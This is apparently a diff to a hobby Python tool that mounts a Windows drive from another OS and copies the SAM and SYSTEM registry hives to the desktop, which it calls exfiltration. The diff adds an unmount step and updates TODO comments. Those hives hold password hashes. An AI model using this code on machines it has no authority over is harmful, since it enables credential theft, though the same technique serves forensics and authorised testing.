@@ -54,10 +54,17 @@ def mount_drive(drive):
     time.sleep(1)
 
 def find_winpayload():
+    # gotta use the mount point made by mount_drive here from the user input
     subprocess.call('cp /media/windows/Windows/System32/config/SAM ~/Desktop/', shell=True)
     subprocess.call('cp /media/windows/Windows/System32/config/SYSTEM ~/Desktop/', shell=True)
 
     print('Sytem and Sam registry hives have been succesfully exfiltrated to ~/Desktop')
+
+    subprocess.Popen("sudo umount /media/windows", shell=True)
+    
+    print('Drive has been unmounted from /media/windows')
+
+
     # i should implement some code that suggests a drive to choose based off of mounting other ones and lsing
     # them. This will be slow but very cool
 
@@ -92,6 +99,7 @@ def pretty_print(drives):
     print("\n********************************************************************************************",end ="")
 
     print("\n*    NTFS              APFS                ext4                FAT             squashfs    *",end ="")
+
     #APFS AND FAT fs are a bit buggy need to fix.
     for drive in drives:
         if "ntfs" in drive.get_fs():
@@ -155,13 +163,14 @@ if __name__ == '__main__':
 
 #pretty print script CHECK
 # 
-# What happens when yourun with no drives 
+# What happens when yourun with no drives CHECK
 
-# copy sam syste security and software
+# copy sam syste security and software 
 
-# Modularize code to implement non hardcoded vals
+# Modularize code to implement non hardcoded vals maybe add user input to select mount point and if none exists
+# ask the user if they want to make a mountpoint
 
-# unmount the drive at end of execution
+# unmount the drive at end of execution CHECK
 
 # new arg that cp files onto the windows box
 
